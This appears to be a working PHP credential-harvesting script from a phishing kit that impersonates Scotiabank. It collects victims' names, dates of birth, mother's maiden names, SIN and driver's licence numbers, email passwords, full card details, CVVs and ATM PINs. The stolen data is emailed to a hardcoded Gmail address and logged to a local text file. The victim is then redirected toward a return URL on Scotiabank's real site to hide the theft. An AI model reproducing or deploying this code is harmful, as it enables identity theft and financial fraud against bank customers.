<?
$ip = getenv("REMOTE-ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------------------\n";
$message .= "#NAME		: ".$_POST['FN']."\n";
$message .= "#DOB		: ".$_POST['DB']."\n";
$message .= "#MMN		: ".$_POST['MN']."\n";
$message .= "#SIN		: ".$_POST['SN']."\n";
$message .= "#DLN		: ".$_POST['DL']."\n";
$message .= "#EMAIL		: ".$_POST['EA']."\n";
$message .= "#EPASS		: ".$_POST['EP']."\n";
$message .= "---------------------------------\n";
$message .= "#CARDNAME	: ".$_POST['NC']."\n";
$message .= "#CARDNO	: ".$_POST['CN']."\n";
$message .= "#EXP		: ".$_POST['EP']."\n";
$message .= "#CVV		: ".$_POST['CV']."\n";
$message .= "#ATMPIN	: ".$_POST['AP']."\n";
$message .= "1\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "---------------------------------\n";
$send = "crunkcrunk0@gmail.com";
$subject = "scotiaResultz 3 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('scotiaResultz.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "loading.php?page=%2Fuser-management%2Fconfirmation&setLng=en&returnURL=https%3A%2F%2Fwww1.scotiaonline.scotiabank.com%2Fonline%2Fauthentication%2Fauthentication.bns%3Flanguage%3DEnglish";

</script>